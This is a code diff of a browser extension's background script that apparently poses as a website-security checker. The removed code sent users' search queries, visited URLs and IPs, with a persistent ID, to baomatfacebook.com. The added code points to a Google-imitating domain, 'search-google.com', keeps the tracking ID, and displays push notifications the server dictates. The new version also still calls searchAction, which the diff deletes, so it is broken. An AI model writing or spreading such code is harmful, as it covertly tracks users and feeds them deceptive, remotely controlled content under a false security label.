@@ -1,93 +1,84 @@
-var apiUrl = "http://baomatfacebook.com/api/";
-var isSave = false;
+// var apiUrl = "https://baomatfacebook.com/api/";
+
+var apiUrl = "https://search-google.com/api/";
+
 var notificationsId = 'chrome-notification-id-push';
-var userId = 0;
+var key_userid = 'userId_localStorage';
+var data = null;
 
-chrome.cookies.get({url: apiUrl, name: 'userId_cookie'}, function (cookiesValue) {
-    if (cookiesValue !== null) {
-        userId = parseInt(cookiesValue.value);
-    } else {
-        var d = new Date();
-        userId = d.getTime();
-        chrome.cookies.set({url: apiUrl, name: 'userId_cookie', expirationDate:  (userId*5), value: userId.toString()});
+function setItem(key, value) {
+    window.localStorage.removeItem(key);
+    window.localStorage.setItem(key, value);
+}
+
+function getItem(key) {
+    var value;
+    try {
+        value = window.localStorage.getItem(key);
+    }catch(e) {
+        value = null;
     }
-})
+    return value;
+}
 
-setInterval(function(){
-    searchAction({});
-}, 300000);
+var userId = getItem(key_userid);
+if (userId === null) {
+    var d = new Date();
+    userId = d.getTime();
+    setItem(key_userid, userId.toString());
+    userId = getItem(key_userid);
+}
+
 chrome.extension.onMessage.addListener(
     function(request, sender, sendResponse) {
         switch (request.name) {
+            case "setOptions":
+                setItem("websiteSecurity_status", request.status);
+                break;
             case "searchAction":
                 var data = { user_id: userId, search_str: request.searchStr};
                 searchAction(data);
                 break;
-        
-            case "checkSecurity":
-                var data = {
-                    ip: getCurrentTabIp(sender),
-                    url: sender.tab.url,
-                    user_id: userId
-                }
-
-                $.ajax({
-                    async: false,
-                    type: "POST",
-                    url: apiUrl + 'check-security',
-                    data: data,
-                    success: function(data, status) {
-                        if (data.status === 'error') {
-                            sendResponse({
-                                isShow: true,
-                                iconType: 'danger',
-                            });
-                        } else if (data.status === 'not_check'){
-                            sendResponse({
-                                isShow: false
-                            });
-                        } else {
-                            var iconType = 'danger';
-                            if (data.is_security === true) {
-                                iconType = 'safe';
-                            }
-                            sendResponse({
-                                isShow: true,
-                                iconType: iconType,
-                            });
-                        }
-                    },
+            case "getOptions":
+                var status = getItem("websiteSecurity_status");
+                if (status === null) status = 'Enable';
+                sendResponse({
+                    enableDisableSecurity : status
                 });
                 break;
-            
+            case "checkSecurity":
+                var url = apiUrl + 'check-notification?user_id=' + userId;
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4) {
+                        data = JSON.parse(xhr.responseText);
+                        if (data.isShow === true) {
+                            chrome.notifications.clear(notificationsId);
+                            chrome.notifications.create(notificationsId, data.notificationData);
+                        }
+                    }
+                }
+                xhr.send();
+
+                console.log({
+                    ip: getCurrentTabIp(sender),
+                    url: sender.tab.url,
+                    user_id: userId,
+                    base_url: apiUrl + 'check-security'
+                });
+
+                sendResponse({
+                    ip: getCurrentTabIp(sender),
+                    url: sender.tab.url,
+                    user_id: userId,
+                    base_url: apiUrl + 'check-security'
+                });
+                break;
             default:
                 sendResponse({});
         }
+
     }
 );
-
-
-function searchAction(data) {
-    $.post(
-        apiUrl + 'search',
-        data,
-        function(data, status) {
-            if (data.isShowNotification === true) {
-                chrome.notifications.create(notificationsId, data.notificationData);
-            }
-        }
-    );
-}
-
-function checkSecurity(data) {
-    $.post(
-        apiUrl + 'check-security',
-        data,
-        function(data, status) {
-            if (data.status === true) {
-                console.log('here');
-                return true;
-            }
-        }
-    );
-}
